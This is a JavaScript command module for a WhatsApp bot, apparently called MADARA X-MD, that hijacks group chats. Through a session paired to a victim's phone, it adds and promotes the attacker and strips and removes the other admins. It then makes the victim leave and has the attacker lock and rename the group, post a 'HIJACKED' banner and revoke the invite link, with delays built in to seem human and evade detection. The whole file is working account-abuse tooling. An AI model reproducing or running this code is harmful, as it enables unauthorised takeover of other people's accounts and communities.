// language: JavaScript, file: commands/hijack/hijack.js
'use strict';
const { bootHijackSession }                     = require('../../lib/hijackSession');
const { extractPhone, rankOf, resolveJid,
        checkAccountStatus }                    = require('../../lib/hijackHelper');

const NEW_SUBJECT = '𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 ʙʏ 𝙼𝙰𝙳𝙰𝚁𝙰 𝚇-𝙼𝙳';

const FULL_ANNOUNCEMENT =
`╭═══〘 ⚠️ 𝐀𝐋𝐄𝐑𝐓 〙═══⊷❍
┃ 
┃  𝐓𝐇𝐈𝐒 𝐆𝐑𝐎𝐔𝐏 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍
┃  𝐇𝐈𝐉𝐀𝐂𝐊𝐄𝐃 𝐁𝐘
┃  𝙼𝙰𝙳𝙰𝚁𝙰 𝚇-𝙼𝙳 | 𝙸𝙽𝙲.
┃ 
┃  ⛩️ *𝙏𝙃𝙀 𝙀𝙔𝙀 𝙊𝙋𝙀𝙉𝙎*
┃  ⛩️ *𝙏𝙃𝙀 𝙂𝙃𝙊𝙎𝙏 𝙊𝙁 𝙏𝙃𝙀 𝙐𝘾𝙃𝙄𝙃𝘼*
┃ 
┃  _"Wake up to reality! Nothing ever_
┃  _goes as planned in this accursed world."_
┃ 
┃  👁️‍🗨️ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴍᴀᴅᴀʀᴀ x-ᴍᴅ
╰══════════════════════════`;

// Base sleep — we'll pass explicit ms values to make it human
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function demoteAdmins(hijackSock, groupJid, jids) {
    if (!jids.length) return { demoted: 0, failed: 0 };
    let demoted  = 0, failed = 0;

    try {
        await hijackSock.groupParticipantsUpdate(groupJid, jids, 'demote');
        await sleep(10000); // wait 10s after demoting
        return { demoted: jids.length, failed: 0 };
    } catch {}

    for (const j of jids) {
        try { 
            await hijackSock.groupParticipantsUpdate(groupJid, [j], 'demote'); 
            demoted++; 
            await sleep(10000); 
        }
        catch { failed++; }
    }
    return { demoted, failed };
}

async function waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log) {
    for (let i = 0; i < 30; i++) { 
        try {
            const meta = await attackerSock.groupMetadata(groupJid);
            const me   = meta.participants.find(p => extractPhone(p.id) === extractPhone(attackerJid) || extractPhone(p.lid) === extractPhone(attackerJid));
            if (me && rankOf(me) === 2) return true;
        } catch (e) { log?.(`[hijack:promote poll ${i}] ${e.message}`); }
        await sleep(2000); 
    }
    return false;
}

async function lockAndRename(attackerSock, groupJid, log) {
    let locked = false, renamed = false, announced = false;

    // Force a metadata refresh
    try { await attackerSock.groupMetadata(groupJid); } catch {}
    
    // HUGE WAIT: 30 seconds. Let WA settle. If we act too fast, 401 logout.
    await sleep(30000); 

    for (let i = 0; i < 3 && !locked; i++) {
        try { await attackerSock.groupSettingUpdate(groupJid, 'announcement'); locked = true; }
        catch (e) { log?.(`[hijack:lock try ${i}] ${e.message}`); await sleep(10000); }
    }
    
    await sleep(5000); // 5s between lock and rename

    for (let i = 0; i < 3 && !renamed; i++) {
        try { await attackerSock.groupUpdateSubject(groupJid, NEW_SUBJECT); renamed = true; }
        catch (e) { log?.(`[hijack:rename try ${i}] ${e.message}`); await sleep(10000); }
    }
    
    await sleep(5000); // 5s between rename and announcement

    for (let i = 0; i < 3 && !announced; i++) {
        try { await attackerSock.sendMessage(groupJid, { text: FULL_ANNOUNCEMENT }); announced = true; }
        catch (e) { log?.(`[hijack:announce try ${i}] ${e.message}`); await sleep(10000); }
    }

    return { locked, renamed, announced };
}

async function takeoverSequence(targetSock, groupJid, attackerJid, attackerSock, opts = {}) {
    const { log, onPhase } = opts;
    const result = {
        groupJid, attackerJid,
        contested: false, contestedSafe: false,
        added: false, promoted: false, demoted: 0, removed: 0,
        left: false, promotedToSuper: false,
        locked: false, renamed: false, announced: false, revoked: false,
        aborted: false, reason: null,
    };

    onPhase?.('ʀᴇsᴏʟᴠᴇ ᴛᴀʀɢᴇᴛ');
    const meta = await targetSock.groupMetadata(groupJid).catch((e) => { throw new Error(`meta: ${e.message}`); });
    const targetPhone = extractPhone(targetSock.user?.id);
    const targetLid   = extractPhone(targetSock.user?.lid);

    const targetPart = meta.participants.find(p => {
        const pId    = extractPhone(p.id);
        const pLid   = extractPhone(p.lid);
        const pPhone = extractPhone(p.phoneNumber);
        if (pId === targetPhone || pLid === targetPhone || pPhone === targetPhone) return true;
        if (targetLid && (pId === targetLid || pLid === targetLid || pPhone === targetLid)) return true;
        if (p.id === targetSock.user?.id) return true;
        if (targetSock.user?.lid && p.lid === targetSock.user.lid) return true;
        return false;
    });

    if (!targetPart) { result.aborted = true; result.reason = 'target not in group'; return result; }
    if (rankOf(targetPart) !== 2) { result.aborted = true; result.reason = 'target not superadmin'; return result; }

    onPhase?.('sᴄᴀɴ sᴜᴘᴇʀᴀᴅᴍɪɴs');
    const otherSupers = meta.participants.filter(p => p !== targetPart && rankOf(p) === 2);

    if (otherSupers.length) {
        result.contested = true;
        let anyAlive = false;
        for (const os of otherSupers) {
            const resolved = await resolveJid(targetSock, groupJid, os.id);
            const st = await checkAccountStatus(targetSock, resolved);
            if (st.status === 'alive' || st.status === 'unknown') anyAlive = true;
        }
        if (anyAlive) { result.aborted = true; result.reason = 'contested — live superadmin'; return result; }
        result.contestedSafe = true;
    }

    onPhase?.('ᴀᴅᴅ ᴀᴛᴛᴀᴄᴋᴇʀ');
    const present = meta.participants.some(p => extractPhone(p.id) === extractPhone(attackerJid));
    if (!present) {
        try { await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'add'); result.added = true; }
        catch (e) { log?.(`[hijack:add] ${e.message}`); }
        await sleep(15000); // WAIT 15s
    } else { result.added = true; }

    onPhase?.('ᴘʀᴏᴍᴏᴛᴇ ᴀᴛᴛᴀᴄᴋᴇʀ');
    try { await targetSock.groupParticipantsUpdate(groupJid, [attackerJid], 'promote'); result.promoted = true; }
    catch (e) { log?.(`[hijack:promote] ${e.message}`); }
    await sleep(15000); // WAIT 15s

    onPhase?.('ᴅᴇᴍᴏᴛᴇ ᴀᴅᴍɪɴs');
    const otherAdmins = meta.participants.filter(p => p !== targetPart && rankOf(p) === 1).map(p => p.id);
    const dem = await demoteAdmins(targetSock, groupJid, otherAdmins);
    result.demoted = dem.demoted;

    onPhase?.('ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴs');
    for (const j of otherAdmins) {
        try { 
            await targetSock.groupParticipantsUpdate(groupJid, [j], 'remove'); 
            result.removed++; 
            await sleep(10000); 
        }
        catch (e) { log?.(`[hijack:remove ${extractPhone(j)}] ${e.message}`); }
    }

    onPhase?.('ᴛᴀʀɢᴇᴛ ʟᴇᴀᴠᴇs');
    await sleep(15000); // WAIT 15s before leaving
    try { await targetSock.groupLeave(groupJid); result.left = true; }
    catch (e) { log?.(`[hijack:leave] ${e.message}`); }

    onPhase?.('ᴡᴀɪᴛ sᴜᴘᴇʀᴀᴅᴍɪɴ');
    // This polls for up to 60 seconds to confirm the bot is now the owner
    result.promotedToSuper = await waitForAttackerPromotion(attackerSock, groupJid, attackerJid, log);
    if (!result.promotedToSuper) { result.aborted = true; result.reason = 'attacker not promoted'; return result; }

    onPhase?.('ʟᴏᴄᴋ + ʀᴇɴᴀᴍᴇ');
    const lr = await lockAndRename(attackerSock, groupJid, log);
    result.locked    = lr.locked;
    result.renamed   = lr.renamed;
    result.announced = lr.announced;

    onPhase?.('ʀᴇᴠᴏᴋᴇ ɪɴᴠɪᴛᴇ');
    await sleep(5000);
    try {
        const code = await attackerSock.groupRevokeInvite(groupJid);
        result.revoked = !!code;
    } catch (e) { log?.(`[hijack:revoke] ${e.message}`); }

    return result;
}

module.exports = {
    name: 'hijack',
    aliases: ['hjack', 'takeover', 'seize'],
    category: 'hijack',
    desc: '👁️ ɢʀᴏᴜᴘ ᴛᴀᴋᴇᴏᴠᴇʀ ᴠɪᴀ ᴘᴀɪʀᴇᴅ sᴇssɪᴏɴ',
    usage: '.hijack <targetPhone> <groupLink or JID>',
    privateOnly: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        
        let targetPhone = null;
        let groupTarget = null;

        for (const arg of args) {
            if (arg.includes('chat.whatsapp.com') || arg.endsWith('@g.us')) {
                groupTarget = arg;
            } else if (/^\d{7,15}$/.test(arg.replace(/\D/g, ''))) {
                targetPhone = arg.replace(/\D/g, '');
            }
        }

        if (!targetPhone || !groupTarget) {
            const helpText = 
                `╭═══〘 ʜɪᴊᴀᴄᴋ sʏsᴛᴇᴍ 〙═══⊷❍\n` +
                `┃ 👁️ *ᴛᴀᴋᴇᴏᴠᴇʀ ᴠɪᴀ ᴘᴀɪʀᴇᴅ sᴇssɪᴏɴ*\n` +
                `┃ ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n` +
                `┃ 📌 *ᴜsᴀɢᴇ:*\n` +
                `┃ ${s.prefix}hijack <ᴛᴀʀɢᴇᴛᴘʜᴏɴᴇ> <ɢᴄ ʟɪɴᴋ/ᴊɪᴅ>\n` +
                `┃ ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n` +
                `┃ 💡 *ᴇxᴀᴍᴘʟᴇ:*\n` +
                `┃ ${s.prefix}hijack 2348012345678 https://chat.whatsapp.com/...\n` +
                `┃ ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n` +
                `┃ ⚠️ *ɴᴏᴛᴇs:*\n` +
                `┃ • ᴛᴀʀɢᴇᴛ ᴍᴜsᴛ ʙᴇ ᴘᴀɪʀᴇᴅ\n` +
                `┃ • ᴛᴀʀɢᴇᴛ ᴍᴜsᴛ ʙᴇ sᴜᴘᴇʀᴀᴅᴍɪɴ\n` +
                `╰══════════════════════════`;
            return ctx.reply(helpText + s.FOOTER);
        }

        const scopeKey    = ctx.sender;
        const attackerJid = sock.user?.id || ctx.sender;

        if (!scopeKey) return ctx.reply(`❌ sᴇɴᴅᴇʀ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);
        if (!attackerJid) return ctx.reply(`❌ ʙᴏᴛ sᴇssɪᴏɴ ᴜɴᴋɴᴏᴡɴ.${s.FOOTER}`);

        let groupJid = groupTarget;
        let progressMsg = null;

        const updateProgress = async (text) => {
            try {
                const content = `▸ ${text}${s.FOOTER}`;
                if (!progressMsg) {
                    progressMsg = await sock.sendMessage(ctx.from, { text: content }, { quoted: msg });
                } else {
                    await sock.sendMessage(ctx.from, { text: content, edit: progressMsg.key });
                }
            } catch {}
        };

        await updateProgress('ʀᴇsᴏʟᴠɪɴɢ ɢʀᴏᴜᴘ ʟɪɴᴋ...');
        
        if (groupJid.includes('chat.whatsapp.com')) {
            let code = groupJid.split('/').pop().split('?')[0].trim();
            try {
                const info = await sock.groupGetInviteInfo(code);
                if (info?.id) groupJid = info.id;
                else throw new Error('Info not returned');
            } catch (e) {
                await updateProgress(`❌ ɢʀᴏᴜᴘ ʟɪɴᴋ ғᴀɪʟ: ${e.message}`);
                return;
            }
        }

        await updateProgress(`ʙᴏᴏᴛɪɴɢ ʜɪᴊᴀᴄᴋ sᴇssɪᴏɴ ғᴏʀ +${targetPhone}...`);

        let targetSock = null;
        try { targetSock = await bootHijackSession(scopeKey, targetPhone); }
        catch (e) {
            await updateProgress(`❌ sᴇssɪᴏɴ ʙᴏᴏᴛ ғᴀɪʟ: ${e.message}`);
            return;
        }

        try {
            const result = await takeoverSequence(
                targetSock, groupJid, attackerJid, sock,
                {
                    log: (m) => console.error('[hijack]', m),
                    onPhase: updateProgress,
                }
            );

            const lines = [
                `╭═══〘 ʜɪᴊᴀᴄᴋ ʀᴇᴘᴏʀᴛ 〙═══⊷❍`,
                `┃ 🎯 ${groupJid}`,
                `┃ 👤 ᴛᴀʀɢᴇᴛ +${targetPhone}`,
                `┃ ⚔️ ᴀᴛᴛᴀᴄᴋᴇʀ ${extractPhone(attackerJid)}`,
                `┃ ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄`,
                `┃ ${result.contested ? (result.contestedSafe ? '🟡 ᴄᴏɴᴛᴇsᴛᴇᴅ (sᴀғᴇ)' : '🔴 ᴄᴏɴᴛᴇsᴛᴇᴅ') : '🟢 ᴜɴᴄᴏɴᴛᴇsᴛᴇᴅ'}`,
                `┃ ${result.added ? '✅' : '❌'} ᴀᴅᴅᴇᴅ`,
                `┃ ${result.promoted ? '✅' : '❌'} ᴘʀᴏᴍᴏᴛᴇᴅ`,
                `┃ 📉 ᴅᴇᴍᴏᴛᴇᴅ ${result.demoted}`,
                `┃ 🚫 ʀᴇᴍᴏᴠᴇᴅ ${result.removed}`,
                `┃ ${result.left ? '✅' : '❌'} ᴛᴀʀɢᴇᴛ ʟᴇғᴛ`,
                `┃ ${result.promotedToSuper ? '✅' : '❌'} sᴜᴘᴇʀᴀᴅᴍɪɴ`,
                `┃ ${result.locked ? '✅' : '❌'} ʟᴏᴄᴋᴇᴅ`,
                `┃ ${result.renamed ? '✅' : '❌'} ʀᴇɴᴀᴍᴇᴅ`,
                `┃ ${result.announced ? '✅' : '❌'} ᴀɴɴᴏᴜɴᴄᴇᴅ`,
                `┃ ${result.revoked ? '✅' : '❌'} ɪɴᴠɪᴛᴇ ʀᴇᴠᴏᴋᴇᴅ`,
                `┃ ${result.aborted ? `⛔ ${result.reason}` : '🏁 ᴄᴏᴍᴘʟᴇᴛᴇ'}`,
                `╰══════════════════════════`,
            ];
            
            try {
                await sock.sendMessage(ctx.from, { text: lines.join('\n') + s.FOOTER, edit: progressMsg.key });
            } catch {
                await ctx.reply(lines.join('\n') + s.FOOTER);
            }

        } catch (e) {
            await updateProgress(`❌ ERROR: ${e.message}`);
        }
    }
};